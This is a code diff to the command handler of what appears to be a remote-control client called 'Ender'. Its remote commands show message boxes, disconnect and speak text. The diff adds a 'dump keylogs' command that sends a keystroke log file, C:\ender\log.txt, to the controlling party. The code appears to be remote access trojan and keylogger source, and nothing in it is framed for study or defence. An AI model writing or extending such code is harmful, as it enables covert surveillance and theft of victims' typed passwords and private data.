@@ -46,7 +46,7 @@ void handle_command(CLIENT& client, string& command)
 {
 	if(command.substr(0,5) == "show ")
 	{
-		MessageBoxA(NULL, command.c_str() + 5, "Ender", MB_OK); // client hangs when messagebox is displayed
+		MessageBoxA(NULL, command.c_str() + 5, "Ender", MB_OK); // TODO: FIX (client hangs when messagebox is displayed)
 	}
 	else if(command == "disconnect")
 	{
@@ -59,5 +59,9 @@ void handle_command(CLIENT& client, string& command)
 	else if(command.substr(0,6) == "speak ")
 	{ 
 		client.speak_command(command.substr((size_t)6));
+	}
+	else if(command == "dump keylogs")
+	{
+		client.send_file("C:\\ender\\log.txt");
 	}
 }
